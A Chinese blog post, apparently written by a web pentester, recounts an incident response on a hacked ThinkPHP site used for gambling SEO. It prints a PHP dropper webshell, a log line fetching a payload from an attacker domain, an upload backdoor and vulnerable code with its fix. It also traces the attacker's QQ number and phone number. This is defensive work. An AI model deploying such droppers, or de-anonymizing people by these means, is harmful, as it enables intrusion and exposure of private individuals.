@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="应急响应 溯源,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="记一次攻防交叉的应急响应转载请注明出处：https://youngrichog.github.io/ 描述最近一个朋友找到我，说访问公司网站总跳转到赌博页面想让我帮忙看一下，由此故事就展开了。 但我很少涉及到防守方的工作，对于应急响应也不是很懂。不过我还是对这些比较感兴趣，偶尔换换口味也是蛮好的。 这次算一次入门级的应急响应，因为涉及到的内容和流程我觉得还是蛮简单的，没有涉及到一些标准流程和工具等">
+<meta name="keywords" content="应急响应 溯源">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次攻防交叉的应急响应">
+<meta property="og:url" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/index.html">
+<meta property="og:site_name" content="YoungRichOG">
+<meta property="og:description" content="记一次攻防交叉的应急响应转载请注明出处：https://youngrichog.github.io/ 描述最近一个朋友找到我，说访问公司网站总跳转到赌博页面想让我帮忙看一下，由此故事就展开了。 但我很少涉及到防守方的工作，对于应急响应也不是很懂。不过我还是对这些比较感兴趣，偶尔换换口味也是蛮好的。 这次算一次入门级的应急响应，因为涉及到的内容和流程我觉得还是蛮简单的，没有涉及到一些标准流程和工具等">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/3.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/4.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/5.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/6.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/7.jpg">
+<meta property="og:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/8.jpg">
+<meta property="og:updated_time" content="2021-11-14T13:31:18.005Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次攻防交叉的应急响应">
+<meta name="twitter:description" content="记一次攻防交叉的应急响应转载请注明出处：https://youngrichog.github.io/ 描述最近一个朋友找到我，说访问公司网站总跳转到赌博页面想让我帮忙看一下，由此故事就展开了。 但我很少涉及到防守方的工作，对于应急响应也不是很懂。不过我还是对这些比较感兴趣，偶尔换换口味也是蛮好的。 这次算一次入门级的应急响应，因为涉及到的内容和流程我觉得还是蛮简单的，没有涉及到一些标准流程和工具等">
+<meta name="twitter:image" content="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/">
+
+
+
+
+
+  <title>记一次攻防交叉的应急响应 | YoungRichOG</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">YoungRichOG</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Web Pentester</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/11/13/记一次攻防交叉的应急响应/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="YoungRichOG">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="YoungRichOG">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">记一次攻防交叉的应急响应</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-11-13T14:22:01+08:00">
+                2021-11-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="记一次攻防交叉的应急响应"><a href="#记一次攻防交叉的应急响应" class="headerlink" title="记一次攻防交叉的应急响应"></a>记一次攻防交叉的应急响应</h1><p><strong><del>转载请注明出处：<a href="https://youngrichog.github.io/" target="_blank" rel="noopener">https://youngrichog.github.io/</a></del></strong></p>
+<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>最近一个朋友找到我，说访问公司网站总跳转到赌博页面想让我帮忙看一下，由此故事就展开了。</p>
+<p>但我很少涉及到防守方的工作，对于应急响应也不是很懂。不过我还是对这些比较感兴趣，偶尔换换口味也是蛮好的。</p>
+<p>这次算一次入门级的应急响应，因为涉及到的内容和流程我觉得还是蛮简单的，没有涉及到一些标准流程和工具等。</p>
+<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>虽说我没有去了解过应急响应的流程，不过这次的话我也把自己的流程记录一下。</p>
+<h3 id="Round-1"><a href="#Round-1" class="headerlink" title="Round 1"></a>Round 1</h3><ol>
+<li><p>借助阿里云-云安全中心(态势感知)告警发现风险点</p>
+<ol>
+<li>发现多处存在后门(Webshell文件)</li>
+<li>使用云安全中心(态势感知)中的Web-CMS漏洞扫描，发现存在Thinkphp RCE漏洞，影响版本为5.0.0~5.0.23，log日志泄漏问题。</li>
+<li>主机恶意请求</li>
+</ol>
+</li>
+<li><p>Thinkphp RCE漏洞修复</p>
+<ol>
+<li>代码修复参考：<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003#diff-d971bc61249787ff68eeb622c554fc47" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003#diff-d971bc61249787ff68eeb622c554fc47</a></li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">library/think/Request.php</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>
+<p>修改为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line"><span class="keyword">if</span> (in_array($method, [<span class="string">'GET'</span>, <span class="string">'POST'</span>, <span class="string">'DELETE'</span>, <span class="string">'PUT'</span>, <span class="string">'PATCH'</span>])) &#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Webshell清理</p>
+<ol>
+<li>使用D盾对备份下来的网站代码进行扫描，发现众多Webshell，并且发现了云安全中心未发现的Webshell，并且进行删除。</li>
+</ol>
+</li>
+<li><p>网络进程层面排查</p>
+<ol>
+<li>对网络连接情况进行筛查，并未发现恶意外连行为，这一点我还是挺诧异的，因为觉得会有成批量的木马和挖矿程序在上面跑。</li>
+<li>对进程进行排查，发现使用php -S开启了多个http服务，这一点引起了我的关注，发现是利用蚁剑插件绕过disable funcation。</li>
+</ol>
+</li>
+</ol>
+<p>完成上述流程后，我认为应该是不会在出现问题了。可是第二天晚上我再次打开云安全中心发现存在后门(Webshell)告警，我决定再次对整体流程进行复盘，开始第二次防守。</p>
+<p>###Round 2</p>
+<p>根据告警情况发现runtime目录下存在木马，猜测是否存在<strong>历史Webshell</strong>的情况，随后开始对Web日志进行排查。</p>
+<p><img src="/2021/11/13/记一次攻防交叉的应急响应/1.jpg" alt="img"></p>
+<p>根据云安全中心告警开始搜索相关日志，发现其日志:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">209.xx.xx.67 - - [09/Nov/2021:13:31:10 +0800] “GET /runtime/cache/03/a4992ddd11ab2d0f99ae38e2fae827m9.php?name=qf.php&amp;url=http://danxxxx.top/dama.txt</span><br></pre></td></tr></table></figure>
+<p>发现是通过/runtime/cache/03/a4992ddd11ab2d0f99ae38e2fae827m9.php去拉一个新的Webshell回来，这里的话发现了疑似攻击者的站点。</p>
+<p>/runtime/cache/03/a4992ddd11ab2d0f99ae38e2fae827m9.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $filename=&amp;$a;</span><br><span class="line">  $a=$_REQUEST[<span class="string">'name'</span>];</span><br><span class="line">  $url=&amp;$b;</span><br><span class="line">  $b=$_REQUEST[<span class="string">'url'</span>];</span><br><span class="line">  @file_put_contents($filename,file_get_contents($url));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这样的文件内容，云安全中心和D盾扫描都没有发现问题，应该是等级太低导致的，毕竟这像一个很正常的功能文件。</p>
+<p>攻击者利用a4992ddd11ab2d0f99ae38e2fae827m9.php远程拉取新写qf.php木马文件，然后导致告警。随手查看a4992ddd11ab2d0f99ae38e2fae827m9.php后门文件的创建日期发现是历史遗留的，2021年10月29日就已经躺在里面了。</p>
+<p><img src="/2021/11/13/记一次攻防交叉的应急响应/3.jpg" alt="img"></p>
+<p>随后根据日志筛选黑客IP，清理了一些历史遗留Webshell文件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">209.xx.xx.67 - - [09/Nov/2021:13:38:23 +0800] &quot;GET /public/downimg/activates.php HTTP/1.1&quot; 200 101 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&quot;</span><br></pre></td></tr></table></figure>
+<p>然后猜测是否还存在Thinkphp runtime缓存漏洞，用工具测试后并未发现存在，然后对/runtime/cache/和runtime/log/下所有文件进行了删除，以防止还有遗留文件是没有被发现的，并对Thinkphp的cache、log、debug模式等进行了关闭。</p>
+<p>开始进行黑盒测试，是否还存在其他漏洞，使用AWVS进行扫描，发现存在8处SQL注入，即开始对代码进行修复，发现各种使用拼接导致SQL注入的发生。</p>
+<p>修复方案：优选参数绑定，由于拼接太多导致修复起来不太顺手，后面部分就用addslashes函数进行过滤。</p>
+<p><img src="/2021/11/13/记一次攻防交叉的应急响应/4.jpg" alt="img"></p>
+<p>修复完成后再次使用AWVS复测，发现问题不存在了。</p>
+<p>继续对网络连接和进程进行查看，由于第一轮发现多处php -S以为是业务需要，就没有在第一轮去理，后面发现并不是业务需要，而是蚁剑绕过disable function插件，这里附上一篇文章：<a href="https://www.mi1k7ea.com/2019/08/03/%E4%BB%8E%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E7%9C%8B%E5%88%A9%E7%94%A8PHP-FPM%E7%BB%95%E8%BF%87disable-functions/" target="_blank" rel="noopener">从蚁剑插件看利用PHP-FPM绕过disable_functions</a>，怪不得在网站根目录下发现了多个.so文件。</p>
+<h3 id="Round-3"><a href="#Round-3" class="headerlink" title="Round 3"></a>Round 3</h3><p>云安全中心又告警了，说发现存在后门(Webshell文件)，然后继续去跟进，发现还是遗留后门，也是一个<strong>正常文件上传功能的后门</strong>，怪不得发现不了。</p>
+<p><img src="/2021/11/13/记一次攻防交叉的应急响应/5.jpg" alt="img"></p>
+<p>upload.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 此页面用来协助 IE6/7 预览图片，因为 IE 6/7 不支持 base64</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$DIR = <span class="string">'preview'</span>;</span><br><span class="line"><span class="comment">// Create target dir</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($DIR)) &#123;</span><br><span class="line">    @mkdir($DIR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cleanupTargetDir = <span class="keyword">true</span>; <span class="comment">// Remove old files</span></span><br><span class="line">$maxFileAge = <span class="number">5</span> * <span class="number">3600</span>; <span class="comment">// Temp file age in seconds</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($cleanupTargetDir) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($DIR) || !$dir = opendir($DIR)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "Failed to open temp directory."&#125;, "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (($file = readdir($dir)) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $tmpfilePath = $DIR . DIRECTORY_SEPARATOR . $file;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove temp file if it is older than the max age and is not the current file</span></span><br><span class="line">        <span class="keyword">if</span> (@filemtime($tmpfilePath) &lt; time() - $maxFileAge) &#123;</span><br><span class="line">            @unlink($tmpfilePath);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$src = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"#^data:image/(\w+);base64,(.*)$#"</span>, $src, $matches)) &#123;</span><br><span class="line"></span><br><span class="line">    $previewUrl = sprintf(</span><br><span class="line">        <span class="string">"%s://%s%s"</span>,</span><br><span class="line">        <span class="keyword">isset</span>($_SERVER[<span class="string">'HTTPS'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTPS'</span>] != <span class="string">'off'</span> ? <span class="string">'https'</span> : <span class="string">'http'</span>,</span><br><span class="line">        $_SERVER[<span class="string">'HTTP_HOST'</span>],</span><br><span class="line">        $_SERVER[<span class="string">'REQUEST_URI'</span>]</span><br><span class="line">    );</span><br><span class="line">    $previewUrl = str_replace(<span class="string">"preview.php"</span>, <span class="string">""</span>, $previewUrl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $base64 = $matches[<span class="number">2</span>];</span><br><span class="line">    $type = $matches[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type === <span class="string">'jpeg'</span>) &#123;</span><br><span class="line">        $type = <span class="string">'jpg'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = md5($base64).<span class="string">".$type"</span>;</span><br><span class="line">    $filePath = $DIR.DIRECTORY_SEPARATOR.$filename;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists($filePath)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $data = base64_decode($base64);</span><br><span class="line">        file_put_contents($filePath, $data);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "result" : "'</span>.$previewUrl.<span class="string">'preview/'</span>.$filename.<span class="string">'", "id" : "id"&#125;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&#123;"jsonrpc" : "2.0", "error" : &#123;"code": 100, "message": "un recoginized source"&#125;&#125;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>后面继续分析日志，把攻击者所访问的200的php文件都清理了，也是发现了攻击者的个人博客站点，103.xx.xx.209证书发现heixxxxx.com和第一轮发现的danxxxx.top为同一人所用，这里先不管它。从日志来看，应该是在使用一些自动化的程序对Webshell进行存活测试，然后木马如果存活则立马写入博彩等页面。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">103.xx.xx.209 - - [11/Nov/2021:21:53:52 +0800] &quot;GET /public/excel/excelxml/upload.php HTTP/1.1&quot; 200 101 &quot;-&quot; &quot;Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)&quot;</span><br><span class="line"></span><br><span class="line">103.xx.xx.209 - - [11/Nov/2021:21:56:06 +0800] &quot;POST /public/excel/excelxml/preview/624ac168ea0bc5905807eb426ffc8112.php HTTP/1.1&quot; 200 3989 &quot;&quot; &quot;Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)&quot;</span><br></pre></td></tr></table></figure>
+<p>为防止还有历史遗留后门存在，主要做了3件事情：</p>
+<ol>
+<li>把所有后门样本进行全盘grep</li>
+<li>重新备份进行木马查杀</li>
+<li>查找最近几月被修改过的文件</li>
+</ol>
+<p>最终确定没有问题，本轮过后目前没有发现告警。</p>
+<h3 id="Round-4"><a href="#Round-4" class="headerlink" title="Round 4"></a>Round 4</h3><p>组织进行渗透测试，从黑盒的角度再次发现安全风险，首先借助自动化工具开展。</p>
+<ol>
+<li>黑盒扫描器(主动)</li>
+<li>黑盒扫扫描器(被动)</li>
+</ol>
+<p>主动：AWVS、Netsparker(推荐)</p>
+<p>被动：Xray</p>
+<p>几轮黑盒扫描器(主动)下来，并没有发现安全风险，使用黑盒扫描器(被动)再次发现SQL注入，主动和被动对比后发现，主动扫描器有些目录是没有爬到，导致没有发现漏洞。</p>
+<p>手工方面的话，后台用户爆破和SQL注入都获取到后台权限，随后利用文件上传获取Webshell。从白盒视角我看过一些代码，发现代码质量比较低，就没有再去跟进了。随后对SQL注入和文件上传漏洞进行了修复。</p>
+<p>SQL注入：参数绑定+addslashes函数过滤</p>
+<p>文件上传：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$infoVideoName = $fileVideoName-&gt;move(ROOT_PATH . &apos;public&apos; . DS . &apos;downimg&apos;);</span><br></pre></td></tr></table></figure>
+<p>修改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$infoVideoName = $fileVideoName-&gt;validate([&apos;ext&apos;=&gt;&apos;jpg,png,gif,jpeg&apos;])-&gt;move(ROOT_PATH . &apos;public&apos; . DS . &apos;downimg&apos;);</span><br></pre></td></tr></table></figure>
+<p>对照Thinkphp上传指南修改，没有再次测试是否可以绕过，只能听天由命了 ，毕竟Round 4是我一时兴起 :-)</p>
+<p>后面发现数据库权限过大可以进行UDF提权，随后进行<strong>降权处理</strong>，创建了一个新用户，仅授予增删改查所用库的权限。</p>
+<h3 id="Round-5"><a href="#Round-5" class="headerlink" title="Round 5"></a>Round 5</h3><p>对攻击者进行溯源，根据日志得到攻击者2个IP，209.xx.xx.67和103.xx.xx.209</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">209.xx.xx.67 - - [09/Nov/2021:13:31:10 +0800] “GET /runtime/cache/03/a4992ddd11ab2d0f99ae38e2fae827m9.php?name=qf.php&amp;url=http://danxxxx.top/dama.txt</span><br><span class="line"></span><br><span class="line">209.xx.xx.67 - - [09/Nov/2021:13:38:23 +0800] &quot;GET /public/downimg/activates.php HTTP/1.1&quot; 200 101 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36&quot;</span><br><span class="line"></span><br><span class="line">103.xx.xx.209 - - [11/Nov/2021:21:53:52 +0800] &quot;GET /public/excel/excelxml/upload.php HTTP/1.1&quot; 200 101 &quot;-&quot; &quot;Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)&quot;</span><br><span class="line"></span><br><span class="line">103.xx.xx.209 - - [11/Nov/2021:21:56:06 +0800] &quot;POST /public/excel/excelxml/preview/624ac168ea0bc5905807eb426ffc8112.php HTTP/1.1&quot; 200 3989 &quot;&quot; &quot;Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)&quot;</span><br></pre></td></tr></table></figure>
+<p>放到fofa进行查询，发现其域名:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexxxxx.com</span><br><span class="line">danxxxxx.top</span><br><span class="line">ayxxxxx.com</span><br></pre></td></tr></table></figure>
+<p>访问后发现为该攻击者个人博客</p>
+<p><img src="/2021/11/13/记一次攻防交叉的应急响应/6.jpg" alt="img"></p>
+<p><img src="/2021/11/13/记一次攻防交叉的应急响应/7.jpg" alt="img"></p>
+<p>想从个人博客发现一些关于攻击者身份的信息，结果发现了一个比较特殊的URL，后面查了一下是<strong>获取QQ头像的接口</strong>，dst_uin对应为QQ号码。这里确定了攻击者的QQ号码：770xxxxxx，猜测攻击者为了图方便。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://q2.qlogo.cn/headimg_dl?dst_uin=770*******&amp;spec=640&amp;img_type=jpg</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/13/记一次攻防交叉的应急响应/8.jpg" alt="img"></p>
+<p>后续通过某些手段获取到攻击者的手机号：17747xxxxxx[内蒙古xxxxxx电信]</p>
+<p>没有在继续深究下去，目前根据手头的信息可以得出：攻击者使用Thinkphp批量漏洞利用工具获取大量Webshell，然后植入木马开始做博彩SEO</p>
+<p>攻击者年龄还是很小的，年龄20岁，警察可以上门抓人了。</p>
+<p>本文对攻击者的个人信息进行了打码处理，给予最基本的尊重。</p>
+<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>主要记录一些在应急响应中使用过的命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">统计访问量TOP10</span><br><span class="line">awk &apos;&#123;print $11&#125;&apos; wwwroot.log | sort | uniq -c | sort -nr | head -10</span><br><span class="line"></span><br><span class="line">打包文件夹，主要是针对于一些图片等资源比较大的情况，排除一些后缀</span><br><span class="line">tar -czvf www.tar.gz xxxx/ --exclude *.jpg --exclude *.png --exclude *.rar --exclude *.zip --exclude *.7z --exclude *.gif --exclude *.JPG --exclude *.jpeg --exclude *.doc --exclude *.xlsx --exclude *.pdf</span><br><span class="line"></span><br><span class="line">查找近30分钟修改过的php文件，可以按自己需求修改</span><br><span class="line">find . -name &apos;*.php&apos; -type f -mmin -30</span><br></pre></td></tr></table></figure>
+<h2 id="感悟"><a href="#感悟" class="headerlink" title="感悟"></a>感悟</h2><p>无论是攻击方还是防守方都要有趁手的武器，因为之前没有做过防守方相应趁手的兵器基本为0，只能是原始低效的进行处置。</p>
+<p>在黑盒测试阶段，主动和被动扫描器之间的差距还是存在的，回归到根本还是”信息搜集”。</p>
+<p>通过QQ获取头像接口找到攻击者身份算是一个不错的发现。</p>
+<p>如果有应急响应的checklist，那么效率一定会提高。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/应急响应-溯源/" rel="tag"># 应急响应 溯源</a>
+          
+        </div>
+      
+
+      
